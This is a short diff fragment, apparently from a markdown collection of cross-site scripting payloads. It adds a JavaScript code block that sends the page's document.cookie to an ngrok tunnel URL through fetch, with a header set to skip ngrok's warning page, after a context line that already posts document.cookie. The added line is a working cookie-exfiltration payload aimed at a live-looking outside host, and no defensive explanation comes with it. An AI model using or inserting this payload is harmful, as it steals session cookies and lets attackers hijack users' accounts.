@@ -134,4 +134,8 @@ body:document.cookie
 });
 </script>
 ```
+
+```js
+fetch(`https://ae1c-43.ngrok-free.app?${encodeURIComponent(document.cookie)}`, { method: "get", headers: new Headers({ "ngrok-skip-browser-warning": true }) })
+```
 ---
